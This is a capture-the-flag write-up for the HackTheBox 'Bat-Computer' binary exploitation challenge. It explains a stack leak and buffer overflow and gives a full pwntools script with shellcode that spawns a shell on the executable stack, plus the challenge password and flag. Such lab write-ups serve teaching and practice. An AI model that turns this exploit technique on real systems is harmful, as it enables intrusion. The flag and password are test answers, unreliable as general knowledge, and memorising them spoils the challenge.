---
title: "Bat-Computer"
ctf: "HackTheBox"
date: 2026-06-07
category: pwn
difficulty: easy
flag_format: "HTB{...}"
---

# Bat-Computer

## Summary

A 64-bit PIE binary with NX disabled (RWE stack). A menu program leaks a stack address (option 1) and has a buffer overflow via `read()` (option 2) after a hardcoded password check. Return to shellcode on the executable stack.

## Solution

### Step 1: Leak stack address

Option 1 prints the address of the data buffer via `printf("... %p ...", buf+0x14)`.

### Step 2: Authenticate & overflow

Option 2 asks for a password (`b4tp@$$w0rd!` from `.rodata`), then reads 0x89 bytes into a buffer at `rbp-0x4c`. The saved RBP is at `rbp` and return address at `rbp+8`, so we need `0x4c` bytes of padding to reach the saved RBP.

NX is disabled (GNU_STACK RWE), so shellcode on the stack will execute.

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'info'

p = process('./challenge/batcomputer')

p.sendlineafter(b'> ', b'1')
p.recvuntil(b'him: ')
leak = int(p.recvline().strip(), 16)

shellcode = asm("""
    mov rax, 0x68732f6e69622f
    push rax
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 59
    syscall
""")

OFFSET_TO_RBP = 0x4c

payload = shellcode
payload += b'A' * (OFFSET_TO_RBP - len(shellcode))
payload += b'B' * 8
payload += p64(leak)

p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'password: ', b'b4tp@$$w0rd!')
p.recvuntil(b'commands: ')
p.send(payload)
p.sendlineafter(b'> ', b'3')

p.interactive()
```

### Step 3: Trigger return

Sending option 3 (any non-1/2 input) exits the menu loop, which executes `leave; ret` using the overwritten return address, jumping to the shellcode.

## Flag

```
HTB{l0v3_y0uR_sh3llf_U_s4v3d_th3_w0rld!}
```
